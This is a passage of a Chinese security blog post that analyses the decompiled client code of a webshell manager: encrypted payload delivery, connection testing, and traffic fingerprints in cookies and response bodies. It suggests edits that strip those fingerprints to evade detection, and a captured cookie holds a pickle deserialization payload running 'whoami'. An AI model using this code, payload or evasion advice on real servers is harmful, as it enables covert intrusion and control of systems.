        <span class="n">JOptionPane</span><span class="o">.</span><span class="na">showMessageDialog</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="s">"initShellOpertion Fail"</span><span class="o">,</span> <span class="s">"提示"</span><span class="o">,</span> <span class="mi">2</span><span class="o">);</span>
    <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">shellContext</span><span class="o">.</span><span class="na">getPayloadModel</span><span class="o">().</span><span class="na">test</span><span class="o">())</span> <span class="o">{</span>
        <span class="n">JOptionPane</span><span class="o">.</span><span class="na">showMessageDialog</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="s">"Success!"</span><span class="o">,</span> <span class="s">"提示"</span><span class="o">,</span> <span class="mi">1</span><span class="o">);</span>
    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
        <span class="n">JOptionPane</span><span class="o">.</span><span class="na">showMessageDialog</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="s">"Payload Test Fail"</span><span class="o">,</span> <span class="s">"提示"</span><span class="o">,</span> <span class="mi">2</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>然后看到 updateTempShellEntity 方法<br/>
就是更新一些初始化的值</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241202222012-8b41aeb6-b0b8-1.png"/></p>
<p>代码中也能看出来他的作用</p>
<p>回到方法往下看<br/>
<strong>initShellOpertion</strong></p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">initShellOpertion</span><span class="o">()</span> <span class="o">{</span>
    <span class="kt">boolean</span> <span class="n">state</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
    <span class="k">try</span> <span class="o">{</span>
        <span class="k">this</span><span class="o">.</span><span class="na">http</span> <span class="o">=</span> <span class="n">ApplicationContext</span><span class="o">.</span><span class="na">getHttp</span><span class="o">(</span><span class="k">this</span><span class="o">);</span>
        <span class="k">this</span><span class="o">.</span><span class="na">payloadModel</span> <span class="o">=</span> <span class="n">ApplicationContext</span><span class="o">.</span><span class="na">getPayload</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">payload</span><span class="o">);</span>
        <span class="k">this</span><span class="o">.</span><span class="na">cryptionModel</span> <span class="o">=</span> <span class="n">ApplicationContext</span><span class="o">.</span><span class="na">getCryption</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">payload</span><span class="o">,</span> <span class="k">this</span><span class="o">.</span><span class="na">cryption</span><span class="o">);</span>
        <span class="c1">//初始化，会发送初始化payload</span>
        <span class="k">this</span><span class="o">.</span><span class="na">cryptionModel</span><span class="o">.</span><span class="na">init</span><span class="o">(</span><span class="k">this</span><span class="o">);</span>
        <span class="k">if</span> <span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">cryptionModel</span><span class="o">.</span><span class="na">check</span><span class="o">())</span> <span class="o">{</span>
            <span class="k">this</span><span class="o">.</span><span class="na">payloadModel</span><span class="o">.</span><span class="na">init</span><span class="o">(</span><span class="k">this</span><span class="o">);</span>
            <span class="c1">//发送测试包</span>
            <span class="k">if</span> <span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">payloadModel</span><span class="o">.</span><span class="na">test</span><span class="o">())</span> <span class="o">{</span>
                <span class="n">state</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
                <span class="n">Log</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="s">"payload Initialize Fail !"</span><span class="o">);</span>
            <span class="o">}</span>
        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
            <span class="n">Log</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="s">"cryption Initialize Fail !"</span><span class="o">);</span>
        <span class="o">}</span>
        <span class="k">return</span> <span class="n">state</span><span class="o">;</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">Log</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
        <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>初始化 payloadModel 和 cryptionModel 对象<br/>
这两个名字就能看出他们的作用，payloadModel</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241202222019-8f2b153a-b0b8-1.png"/></p>
<p>可以看到它实现的接口，都是用于文件操作和命令执行的<br/>
而 getCryption 就是加解密的</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241202222024-91f0e646-b0b8-1.png"/></p>
<p>然后就是相应的init 方法</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kt">void</span> <span class="nf">init</span><span class="o">(</span><span class="n">ShellEntity</span> <span class="n">context</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">this</span><span class="o">.</span><span class="na">shell</span> <span class="o">=</span> <span class="n">context</span><span class="o">;</span>
    <span class="k">this</span><span class="o">.</span><span class="na">http</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">shell</span><span class="o">.</span><span class="na">getHttp</span><span class="o">();</span>
    <span class="k">this</span><span class="o">.</span><span class="na">key</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">shell</span><span class="o">.</span><span class="na">getSecretKeyX</span><span class="o">();</span>
    <span class="k">this</span><span class="o">.</span><span class="na">pass</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">shell</span><span class="o">.</span><span class="na">getPassword</span><span class="o">();</span>
    <span class="n">String</span> <span class="n">findStrMd5</span> <span class="o">=</span> <span class="n">functions</span><span class="o">.</span><span class="na">md5</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">pass</span> <span class="o">+</span> <span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">key</span><span class="o">));</span>
    <span class="c1">//初始化md5标识</span>
    <span class="k">this</span><span class="o">.</span><span class="na">findStrLeft</span> <span class="o">=</span> <span class="n">findStrMd5</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="mi">0</span><span class="o">,</span> <span class="mi">16</span><span class="o">).</span><span class="na">toUpperCase</span><span class="o">();</span>
    <span class="k">this</span><span class="o">.</span><span class="na">findStrRight</span> <span class="o">=</span> <span class="n">findStrMd5</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="mi">16</span><span class="o">).</span><span class="na">toUpperCase</span><span class="o">();</span>
    <span class="k">try</span> <span class="o">{</span>
        <span class="k">this</span><span class="o">.</span><span class="na">encodeCipher</span> <span class="o">=</span> <span class="n">Cipher</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">"AES"</span><span class="o">);</span>
        <span class="k">this</span><span class="o">.</span><span class="na">decodeCipher</span> <span class="o">=</span> <span class="n">Cipher</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">"AES"</span><span class="o">);</span>
        <span class="k">this</span><span class="o">.</span><span class="na">encodeCipher</span><span class="o">.</span><span class="na">init</span><span class="o">(</span><span class="mi">1</span><span class="o">,</span> <span class="k">new</span> <span class="n">SecretKeySpec</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">key</span><span class="o">.</span><span class="na">getBytes</span><span class="o">(),</span> <span class="s">"AES"</span><span class="o">));</span>
        <span class="k">this</span><span class="o">.</span><span class="na">decodeCipher</span><span class="o">.</span><span class="na">init</span><span class="o">(</span><span class="mi">2</span><span class="o">,</span> <span class="k">new</span> <span class="n">SecretKeySpec</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">key</span><span class="o">.</span><span class="na">getBytes</span><span class="o">(),</span> <span class="s">"AES"</span><span class="o">));</span>
        <span class="k">this</span><span class="o">.</span><span class="na">payload</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">shell</span><span class="o">.</span><span class="na">getPayloadModel</span><span class="o">().</span><span class="na">getPayload</span><span class="o">();</span>
        <span class="k">if</span> <span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">payload</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">this</span><span class="o">.</span><span class="na">http</span><span class="o">.</span><span class="na">sendHttpResponse</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">payload</span><span class="o">);</span>
            <span class="k">this</span><span class="o">.</span><span class="na">state</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
            <span class="k">return</span><span class="o">;</span>
        <span class="o">}</span>
        <span class="n">Log</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="s">"payload Is Null"</span><span class="o">);</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">Log</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241202222031-961c8996-b0b8-1.png"/></p>
<p>可以看到初始化了我们传入的必要参数,然后对我们的后续加解密做一个处理，这里分析 paylaod<br/>
而这个 paylaod 其实就是 shells/java/assets/payload.class 类文件的字节码<br/>
然后通过 sendHttpResponse 发送给我们的服务端</p>
<p>对应的加密逻辑其实也是在 sendHttpResponse 方法<br/>
最终重载的方法是在</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="n">HttpResponse</span> <span class="nf">sendHttpResponse</span><span class="o">(</span><span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">String</span><span class="o">&gt;</span> <span class="n">header</span><span class="o">,</span> <span class="kt">byte</span><span class="o">[]</span> <span class="n">requestData</span><span class="o">,</span> <span class="kt">int</span> <span class="n">connTimeOut</span><span class="o">,</span> <span class="kt">int</span> <span class="n">readTimeOut</span><span class="o">)</span> <span class="o">{</span>
    <span class="kt">int</span> <span class="n">i</span><span class="o">;</span>
    <span class="kt">int</span> <span class="n">i2</span> <span class="o">=</span> <span class="mi">1</span><span class="o">;</span>
    <span class="c1">//对发送数据进行加密</span>
    <span class="kt">byte</span><span class="o">[]</span> <span class="n">requestData2</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">shellContext</span><span class="o">.</span><span class="na">getCryptionModel</span><span class="o">().</span><span class="na">encode</span><span class="o">(</span><span class="n">requestData</span><span class="o">);</span>
    <span class="k">if</span> <span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">shellContext</span><span class="o">.</span><span class="na">isSendLRReqData</span><span class="o">())</span> <span class="o">{</span>
        <span class="kt">byte</span><span class="o">[]</span> <span class="n">leftData</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">shellContext</span><span class="o">.</span><span class="na">getReqLeft</span><span class="o">().</span><span class="na">getBytes</span><span class="o">();</span>
        <span class="kt">byte</span><span class="o">[]</span> <span class="n">rightData</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">shellContext</span><span class="o">.</span><span class="na">getReqRight</span><span class="o">().</span><span class="na">getBytes</span><span class="o">();</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">leftData</span><span class="o">.</span><span class="na">length</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">i</span> <span class="o">=</span> <span class="n">leftData</span><span class="o">.</span><span class="na">length</span><span class="o">;</span>
        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
            <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="o">;</span>
        <span class="o">}</span>
        <span class="n">Object</span> <span class="n">concatArrays</span> <span class="o">=</span> <span class="n">functions</span><span class="o">.</span><span class="na">concatArrays</span><span class="o">(</span><span class="n">leftData</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="o">,</span> <span class="n">requestData2</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">requestData2</span><span class="o">.</span><span class="na">length</span> <span class="o">-</span> <span class="mi">1</span><span class="o">);</span>
        <span class="kt">int</span> <span class="n">length</span> <span class="o">=</span> <span class="o">(</span><span class="n">leftData</span><span class="o">.</span><span class="na">length</span> <span class="o">+</span> <span class="n">requestData2</span><span class="o">.</span><span class="na">length</span><span class="o">)</span> <span class="o">-</span> <span class="mi">1</span><span class="o">;</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">rightData</span><span class="o">.</span><span class="na">length</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">i2</span> <span class="o">=</span> <span class="n">rightData</span><span class="o">.</span><span class="na">length</span><span class="o">;</span>
        <span class="o">}</span>
        <span class="n">requestData2</span> <span class="o">=</span> <span class="o">(</span><span class="kt">byte</span><span class="o">[])</span> <span class="n">functions</span><span class="o">.</span><span class="na">concatArrays</span><span class="o">(</span><span class="n">concatArrays</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">length</span><span class="o">,</span> <span class="n">rightData</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">i2</span> <span class="o">-</span> <span class="mi">1</span><span class="o">);</span>
    <span class="o">}</span>
    <span class="k">return</span> <span class="n">SendHttpConn</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">shellContext</span><span class="o">.</span><span class="na">getUrl</span><span class="o">(),</span> <span class="s">"POST"</span><span class="o">,</span> <span class="n">header</span><span class="o">,</span> <span class="n">requestData2</span><span class="o">,</span> <span class="n">connTimeOut</span><span class="o">,</span> <span class="n">readTimeOut</span><span class="o">,</span> <span class="k">this</span><span class="o">.</span><span class="na">proxy</span><span class="o">);</span>
<span class="o">}</span>
</pre></div>
<p>先是 getCryptionModel 获取我们已经初始化好的对象，然后调用它的 encode 方法去加密<br/>
加密逻辑如下</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kt">byte</span><span class="o">[]</span> <span class="nf">encode</span><span class="o">(</span><span class="kt">byte</span><span class="o">[]</span> <span class="n">data</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">try</span> <span class="o">{</span>
        <span class="k">return</span> <span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">pass</span> <span class="o">+</span> <span class="s">"="</span> <span class="o">+</span> <span class="n">URLEncoder</span><span class="o">.</span><span class="na">encode</span><span class="o">(</span><span class="n">functions</span><span class="o">.</span><span class="na">base64Encode</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">encodeCipher</span><span class="o">.</span><span class="na">doFinal</span><span class="o">(</span><span class="n">data</span><span class="o">)))).</span><span class="na">getBytes</span><span class="o">();</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">Log</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>可以通过 bp 抓</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241202222039-9add0122-b0b8-1.png"/></p>
<p>然后我们关注它的 check 方法，这个决定了我们是否进行下一步</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">check</span><span class="o">()</span> <span class="o">{</span>
    <span class="k">return</span> <span class="k">this</span><span class="o">.</span><span class="na">state</span><span class="o">;</span>
<span class="o">}</span>
</pre></div>
<p>关键因素就是 state 的值<br/>
赋值还是在我们的 init 方法</p>
<div class="highlight"><pre><span></span><span class="k">if</span> <span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">payload</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">this</span><span class="o">.</span><span class="na">http</span><span class="o">.</span><span class="na">sendHttpResponse</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">payload</span><span class="o">);</span>
    <span class="k">this</span><span class="o">.</span><span class="na">state</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
    <span class="k">return</span><span class="o">;</span>
<span class="o">}</span>
</pre></div>
<p>通过请求是否发送成功来判断的<br/>
然后开始 payloadModel 的 init 方法了<br/>
其实就是获取一些基础的东西</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kt">void</span> <span class="nf">init</span><span class="o">(</span><span class="n">ShellEntity</span> <span class="n">shellContext</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">this</span><span class="o">.</span><span class="na">shell</span> <span class="o">=</span> <span class="n">shellContext</span><span class="o">;</span>
    <span class="k">this</span><span class="o">.</span><span class="na">http</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">shell</span><span class="o">.</span><span class="na">getHttp</span><span class="o">();</span>
    <span class="k">this</span><span class="o">.</span><span class="na">encoding</span> <span class="o">=</span> <span class="n">Encoding</span><span class="o">.</span><span class="na">getEncoding</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">shell</span><span class="o">);</span>
<span class="o">}</span>
</pre></div>
<p>然后来到 test 方法<br/>
简单说了，这里主要和强特征有关系<br/>
就是执行 test 后会发送一个请求，表示 ok</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241202222044-9e61f582-b0b8-1.png"/></p>
<p>按照</p>
<div class="highlight"><pre><span></span><span class="n">加密后的data</span>  <span class="o">-&gt;</span> <span class="n">url解码</span>
<span class="o">-&gt;</span>  <span class="n">base64解码</span>
        <span class="o">-&gt;</span> <span class="n">aes</span> <span class="n">解密</span>
                <span class="o">-&gt;</span>  <span class="n">data</span>
</pre></div>
<p>就是 ok<br/>
但是发现一个连接成功的请求会发送两次一样的流量<br/>
因为在 testButtonClick 方法还会执行 this.shellContext.getPayloadModel().test()</p>
<div class="highlight"><pre><span></span><span class="n">JSESSIONID</span><span class="o">=</span><span class="mf">3E8</span><span class="n">AA54AFF6C2181D507E41CB5937CC8</span><span class="o">;</span> <span class="n">b</span><span class="o">-</span><span class="n">user</span><span class="o">-</span><span class="n">id</span><span class="o">=</span><span class="n">b5490138</span><span class="o">-</span><span class="mi">8359</span><span class="o">-</span><span class="mi">6825</span><span class="o">-</span><span class="mi">70</span><span class="n">e1</span><span class="o">-</span><span class="mi">36</span><span class="n">fa65145827</span><span class="o">;</span> <span class="n">Goland</span><span class="o">-</span><span class="n">d16e3610</span><span class="o">=</span><span class="mi">28</span><span class="n">e7f147</span><span class="o">-</span><span class="mi">51</span><span class="n">b1</span><span class="o">-</span><span class="mf">4f</span><span class="mi">14</span><span class="o">-</span><span class="mi">80</span><span class="n">ea</span><span class="o">-</span><span class="mi">32104</span><span class="n">ce16340</span><span class="o">;</span> <span class="n">RememberMe</span><span class="o">=</span><span class="n">gASVagAAAAAAAACMA2FwcJSMBUxvZ2lulJOUKYGUfZQojARuYW1llIwfYicnJyhjb3Mgc3lzdGVtIFMnd2hvYW1pJyBvLicnJ5SMA3B3ZJSMH2InJycoY29zIHN5c3RlbSBTJ3dob2FtaScgby4nJyeUdWIu</span><span class="o">;</span> <span class="n">dreamer</span><span class="o">-</span><span class="n">cms</span><span class="o">-</span><span class="n">s</span><span class="o">=</span><span class="mi">77128981</span><span class="o">-</span><span class="mf">8d</span><span class="mi">6</span><span class="n">c</span><span class="o">-</span><span class="mf">4f</span><span class="mi">8</span><span class="n">b</span><span class="o">-</span><span class="mf">8d</span><span class="n">f8</span><span class="o">-</span><span class="n">dbd72815e323</span><span class="o">;</span> <span class="n">Idea</span><span class="o">-</span><span class="mi">6</span><span class="n">eab18cc</span><span class="o">=</span><span class="n">b90e0a78</span><span class="o">-</span><span class="mi">0</span><span class="n">a4a</span><span class="o">-</span><span class="mf">4d</span><span class="mi">1</span><span class="n">b</span><span class="o">-</span><span class="mi">9992</span><span class="o">-</span><span class="n">facc3898e358</span><span class="o">;</span> <span class="n">JSESSIONID</span><span class="o">=</span><span class="n">ACB916B2E94C3D611F5D1FA014CA9FAD</span>
</pre></div>
<h2 data-content="1" id="340a89c8498bea7caf4c5aa5e0429777">流量特征</h2>
<h3 data-content="1" id="9daf8ee07d830ec1e16aafdbcc9c1ebc">cookie 的;号</h3>
<p>观察我们的 bp 的包</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241202222050-a1834860-b0b8-1.png"/></p>
<p>可以发现 cookie 后面是有一个；号的</p>
<p>按照道理来说，最后一个 cookie 值是不应该有;号的，随便找一个包，也可以证实</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241202222057-a5a9e7fa-b0b8-1.png"/></p>
<p>我们寻找对应的代码逻辑，也就是 setcookie 的值<br/>
对应的代码如下</p>
<div class="highlight"><pre><span></span><span class="kd">protected</span> <span class="kt">void</span> <span class="nf">handleHeader</span><span class="o">(</span><span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">List</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;&gt;</span> <span class="n">map</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">this</span><span class="o">.</span><span class="na">headerMap</span> <span class="o">=</span> <span class="n">map</span><span class="o">;</span>
    <span class="k">this</span><span class="o">.</span><span class="na">message</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)((</span><span class="n">List</span><span class="o">)</span><span class="n">map</span><span class="o">.</span><span class="na">get</span><span class="o">((</span><span class="n">Object</span><span class="o">)</span><span class="kc">null</span><span class="o">)).</span><span class="na">get</span><span class="o">(</span><span class="mi">0</span><span class="o">);</span>

    <span class="k">try</span> <span class="o">{</span>
        <span class="n">Http</span> <span class="n">http</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">shellEntity</span><span class="o">.</span><span class="na">getHttp</span><span class="o">();</span>
        <span class="n">http</span><span class="o">.</span><span class="na">getCookieManager</span><span class="o">().</span><span class="na">put</span><span class="o">(</span><span class="n">http</span><span class="o">.</span><span class="na">getUri</span><span class="o">(),</span> <span class="n">map</span><span class="o">);</span>
        <span class="n">http</span><span class="o">.</span><span class="na">getCookieManager</span><span class="o">().</span><span class="na">getCookieStore</span><span class="o">().</span><span class="na">get</span><span class="o">(</span><span class="n">http</span><span class="o">.</span><span class="na">getUri</span><span class="o">());</span>
        <span class="n">List</span><span class="o">&lt;</span><span class="n">HttpCookie</span><span class="o">&gt;</span> <span class="n">cookies</span> <span class="o">=</span> <span class="n">http</span><span class="o">.</span><span class="na">getCookieManager</span><span class="o">().</span><span class="na">getCookieStore</span><span class="o">().</span><span class="na">get</span><span class="o">(</span><span class="n">http</span><span class="o">.</span><span class="na">getUri</span><span class="o">());</span>
        <span class="n">StringBuilder</span> <span class="n">sb</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringBuilder</span><span class="o">();</span>
        <span class="n">cookies</span><span class="o">.</span><span class="na">forEach</span><span class="o">((</span><span class="n">cookie</span><span class="o">)</span> <span class="o">-&gt;</span> <span class="o">{</span>
            <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">String</span><span class="o">.</span><span class="na">format</span><span class="o">(</span><span class="s">" %s=%s;"</span><span class="o">,</span> <span class="n">cookie</span><span class="o">.</span><span class="na">getName</span><span class="o">(),</span> <span class="n">cookie</span><span class="o">.</span><span class="na">getValue</span><span class="o">()));</span>
        <span class="o">});</span>
        <span class="k">this</span><span class="o">.</span><span class="na">shellEntity</span><span class="o">.</span><span class="na">getHeaders</span><span class="o">().</span><span class="na">put</span><span class="o">(</span><span class="s">"Cookie"</span><span class="o">,</span> <span class="n">sb</span><span class="o">.</span><span class="na">toString</span><span class="o">().</span><span class="na">trim</span><span class="o">());</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">var5</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">var5</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
    <span class="o">}</span>

<span class="o">}</span>
</pre></div>
<p>可以看到形式为%s=%s;后面加了分号，我们直接删掉</p>
<h3 data-content="1" id="a6a19e32bccba6bdf30dc978a597eea4">响应体特征</h3>
<p>我们随便找一个响应的包</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241202222102-a8ffbd30-b0b8-1.png"/></p>
<p>发现很想 base64，但是前后面又加了一些奇怪的东西</p>
<p>md5 前十六位+base64+md5 后十六位</p>
<p>代码对应的逻辑是在我们的模板文件</p>
<div class="highlight"><pre><span></span><span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="n">md5</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="mi">0</span><span class="o">,</span> <span class="mi">16</span><span class="o">));</span>

<span class="c1">// 将 ByteArrayOutputStream 的内容进行 Base64 编码后写入响应</span>
<span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="n">base64Encode</span><span class="o">(</span><span class="n">x</span><span class="o">(</span><span class="n">arrOut</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">(),</span> <span class="kc">true</span><span class="o">)));</span>

<span class="c1">// 输出 md5 后半部分</span>
<span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="n">md5</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="mi">16</span><span class="o">));</span>
</pre></div>
<p>可以看到响应就是这样写的</p>
<p>我们可以直接修改模板文件，毕竟 jsp 中是可以插入 html 代码的</p>
<p>但是只修改模板文件是不行的,你毕竟还有前端和后端<br/>
我们看看后端是如何处理这个内容的</p>
<p>我们看看对响应的逻辑处理</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="nf">HttpResponse</span><span class="o">(</span><span class="n">HttpURLConnection</span> <span class="n">http</span><span class="o">,</span> <span class="n">ShellEntity</span> <span class="n">shellEntity2</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
    <span class="k">this</span><span class="o">.</span><span class="na">shellEntity</span> <span class="o">=</span> <span class="n">shellEntity2</span><span class="o">;</span>
    <span class="n">handleHeader</span><span class="o">(</span><span class="n">http</span><span class="o">.</span><span class="na">getHeaderFields</span><span class="o">());</span>
    <span class="n">ReadAllData</span><span class="o">(</span><span class="n">getInputStream</span><span class="o">(</span><span class="n">http</span><span class="o">));</span>
<span class="o">}</span>
</pre></div>
<p>把响应传入了 ReadAllData 方法</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kt">void</span> <span class="nf">ReadAllData</span><span class="o">(</span><span class="n">InputStream</span> <span class="n">inputStream</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
    <span class="k">try</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">headerMap</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"Content-Length"</span><span class="o">)</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">||</span> <span class="k">this</span><span class="o">.</span><span class="na">headerMap</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"Content-Length"</span><span class="o">).</span><span class="na">size</span><span class="o">()</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">this</span><span class="o">.</span><span class="na">result</span> <span class="o">=</span> <span class="n">ReadUnknownNumData</span><span class="o">(</span><span class="n">inputStream</span><span class="o">);</span>
        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
            <span class="k">this</span><span class="o">.</span><span class="na">result</span> <span class="o">=</span> <span class="n">ReadKnownNumData</span><span class="o">(</span><span class="n">inputStream</span><span class="o">,</span> <span class="n">Integer</span><span class="o">.</span><span class="na">parseInt</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">headerMap</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"Content-Length"</span><span class="o">).</span><span class="na">get</span><span class="o">(</span><span class="mi">0</span><span class="o">)));</span>
        <span class="o">}</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">NumberFormatException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">this</span><span class="o">.</span><span class="na">result</span> <span class="o">=</span> <span class="n">ReadUnknownNumData</span><span class="o">(</span><span class="n">inputStream</span><span class="o">);</span>
    <span class="o">}</span>
    <span class="k">this</span><span class="o">.</span><span class="na">result</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">shellEntity</span><span class="o">.</span><span class="na">getCryptionModel</span><span class="o">().</span><span class="na">decode</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">result</span><span class="o">);</span>
<span class="o">}</span>
</pre></div>
<p>跟进 decode 方法</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kt">byte</span><span class="o">[]</span> <span class="nf">decode</span><span class="o">(</span><span class="kt">byte</span><span class="o">[]</span> <span class="n">data</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">try</span> <span class="o">{</span>
        <span class="c1">//这里注意有个findStr</span>
